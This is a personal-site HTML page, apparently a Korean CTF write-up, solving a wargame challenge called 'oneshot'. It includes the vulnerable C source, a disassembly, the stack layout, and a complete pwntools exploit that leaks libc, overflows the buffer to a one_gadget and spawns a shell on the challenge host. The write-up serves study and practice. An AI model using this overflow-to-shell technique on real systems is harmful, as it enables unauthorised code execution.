@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf8 · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag {
+      background: var(--tag); border-radius: 4px;
+      padding: .1rem .5rem; font-size: .72rem; color: var(--muted);
+    }
+    .post-body { line-height: 1.8; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.3rem; font-weight: 400; margin: 2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.5rem 0 .5rem; }
+    .post-body p  { margin-bottom: 1rem; color: var(--ink); }
+    .post-body ul { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .3rem; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem;
+      margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code {
+      background: var(--tag); border-radius: 3px;
+      padding: .1rem .35rem; font-size: .85em;
+    }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+
+<main class="page">
+  <a class="back-link" href="../posts.html">
+    ← Back to Posts
+  </a>
+
+  <div class="post-header">
+    <h1>ctf8</h1>
+    <div class="post-meta">
+      <span>2026·03</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+
+  <hr class="post-divider">
+
+  <div class="post-body">
+<h2>문제</h2>
+
+<h3>Description</h3>
+
+<p>이 문제는 작동하고 있는 서비스(oneshot)의 바이너리와 소스코드가 주어집니다.</p>
+
+<p>프로그램의 취약점을 찾고 셸을 획득한 후, "flag" 파일을 읽으세요.</p>
+
+<p>"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.</p>
+
+<p>플래그의 형식은 DH{...} 입니다.</p>
+
+<pre><code class="language-c">
+└─$ cat oneshot.c
+// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(60);
+}
+
+int main(int argc, char *argv[]) {
+    char msg[16];
+    size_t check = 0;
+
+    initialize();
+
+    printf("stdout: %p\n", stdout);
+
+    printf("MSG: ");
+    read(0, msg, 46);
+
+    if(check &gt; 0) {
+        exit(0);
+    }
+
+    printf("MSG: %s\n", msg);
+    memset(msg, 0, sizeof(msg));
+    return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-nasm">
+gef➤  disassemble main
+Dump of assembler code for function main:
+   0x0000000000000a41 &lt;+0&gt;:     push   rbp
+   0x0000000000000a42 &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000000a45 &lt;+4&gt;:     sub    rsp,0x30
+   0x0000000000000a49 &lt;+8&gt;:     mov    DWORD PTR [rbp-0x24],edi
+   0x0000000000000a4c &lt;+11&gt;:    mov    QWORD PTR [rbp-0x30],rsi
+   0x0000000000000a50 &lt;+15&gt;:    mov    QWORD PTR [rbp-0x8],0x0
+   0x0000000000000a58 &lt;+23&gt;:    mov    eax,0x0
+   0x0000000000000a5d &lt;+28&gt;:    call   0x9da &lt;initialize&gt;
+   0x0000000000000a62 &lt;+33&gt;:    mov    rax,QWORD PTR [rip+0x200567]        # 0x200fd0
+   0x0000000000000a69 &lt;+40&gt;:    mov    rax,QWORD PTR [rax]
+   0x0000000000000a6c &lt;+43&gt;:    mov    rsi,rax
+   0x0000000000000a6f &lt;+46&gt;:    lea    rdi,[rip+0x107]        # 0xb7d
+   0x0000000000000a76 &lt;+53&gt;:    mov    eax,0x0
+   0x0000000000000a7b &lt;+58&gt;:    call   0x800 &lt;printf@plt&gt;
+   0x0000000000000a80 &lt;+63&gt;:    lea    rdi,[rip+0x102]        # 0xb89
+   0x0000000000000a87 &lt;+70&gt;:    mov    eax,0x0
+   0x0000000000000a8c &lt;+75&gt;:    call   0x800 &lt;printf@plt&gt;
+   0x0000000000000a91 &lt;+80&gt;:    lea    rax,[rbp-0x20]
+   0x0000000000000a95 &lt;+84&gt;:    mov    edx,0x2e
+   0x0000000000000a9a &lt;+89&gt;:    mov    rsi,rax
+   0x0000000000000a9d &lt;+92&gt;:    mov    edi,0x0
+   0x0000000000000aa2 &lt;+97&gt;:    call   0x830 &lt;read@plt&gt;
+   0x0000000000000aa7 &lt;+102&gt;:   cmp    QWORD PTR [rbp-0x8],0x0
+   0x0000000000000aac &lt;+107&gt;:   je     0xab8 &lt;main+119&gt;
+   0x0000000000000aae &lt;+109&gt;:   mov    edi,0x0
+   0x0000000000000ab3 &lt;+114&gt;:   call   0x870 &lt;exit@plt&gt;
+   0x0000000000000ab8 &lt;+119&gt;:   lea    rax,[rbp-0x20]
+   0x0000000000000abc &lt;+123&gt;:   mov    rsi,rax
+   0x0000000000000abf &lt;+126&gt;:   lea    rdi,[rip+0xc9]        # 0xb8f
+   0x0000000000000ac6 &lt;+133&gt;:   mov    eax,0x0
+   0x0000000000000acb &lt;+138&gt;:   call   0x800 &lt;printf@plt&gt;
+   0x0000000000000ad0 &lt;+143&gt;:   lea    rax,[rbp-0x20]
+   0x0000000000000ad4 &lt;+147&gt;:   mov    edx,0x10
+   0x0000000000000ad9 &lt;+152&gt;:   mov    esi,0x0
+   0x0000000000000ade &lt;+157&gt;:   mov    rdi,rax
+   0x0000000000000ae1 &lt;+160&gt;:   call   0x810 &lt;memset@plt&gt;
+   0x0000000000000ae6 &lt;+165&gt;:   mov    eax,0x0
+   0x0000000000000aeb &lt;+170&gt;:   leave
+   0x0000000000000aec &lt;+171&gt;:   ret
+</code></pre>
+
+<h3>Stack 상태</h3>
+
+<p>| <strong><code>msg[16]</code></strong> | <strong><code>rbp-0x20</code></strong> |</p>
+<p>| --- | --- |</p>
+<p>| <strong><code>check</code></strong> | <strong><code>rbp-0x8</code></strong> |</p>
+<p>| <strong><code>rbp</code></strong> | <strong><code>rbp</code></strong> |</p>
+<p>| <strong><code>return addr</code></strong> | <strong><code>rbp+0x8</code></strong> |</p>
+
+<p>0x20 - 0x08 = x18 = 24바이트</p>
+
+<p>msg ~ return 까지 40바이트 필요</p>
+
+<h3>one_gadget</h3>
+
+<p>: 실행하면 쉘이 획득되는 코드 뭉치</p>
+
+<pre><code class="language-nasm">
+one_gadget [라이브러리 파일 경로]
+</code></pre>
+<p><img width="1031" height="489" alt="image" src="https://github.com/user-attachments/assets/fa911cf6-c36a-4439-9eea-b7ecace876a0" /></p>
+
+
+<p>: one_gadget 의 offset</p>
+
+<h3>exploit.py</h3>
+
+<pre><code class="language-python">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0327]
+└─$ cat exploit.py
+from pwn import *
+
+p = remote("host8.dreamhack.games", 13819)
+libc = ELF('./libc.so.6')
+
+p.recvuntil(b"stdout: ")
+stdout_leak = int(p.recvline().strip(), 16)
+libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
+success(f"Libc base: {hex(libc_base)}")
+
+one_gadget = libc_base + 0x45216
+
+payload = b"A" * 24             
+payload += p64(0)                
+payload += b"B" * 8              
+payload += p64(one_gadget)[:6]   
+
+p.sendafter(b"MSG: ", payload)
+
+p.interactive()
+</code></pre>
+  </div>
+</main>
+
+<script src="../../js/nav.js"></script>
+</body>
+</html>
